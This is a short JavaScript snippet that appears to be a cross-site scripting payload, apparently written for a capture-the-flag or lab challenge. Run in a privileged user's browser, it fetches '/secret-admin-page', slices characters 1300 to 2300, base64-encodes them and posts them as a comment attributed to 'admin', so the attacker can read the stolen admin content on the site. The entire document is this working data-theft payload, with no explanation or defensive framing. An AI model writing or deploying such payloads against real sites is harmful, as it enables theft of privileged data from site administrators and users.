fetch("/secret-admin-page")
  .then(response => response.text())
  .then(adminData => {
    // Extract characters from index 1300 to 2300
    const slicedData = adminData.slice(1300, 2301); // Use 2301 to include the character at position 2300

    const postData = new URLSearchParams({
      comment2: btoa(slicedData), // Base64 encode the sliced data
      "comment-author": "admin"
    });
    return fetch("/post-comment", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: postData,
    });
  })
  .then(response => response.text())
  .then(result => {
    console.log("Post result:", result);
  })
  .catch(error => {
    console.error("There was a problem with the fetch operation:", error);
  });
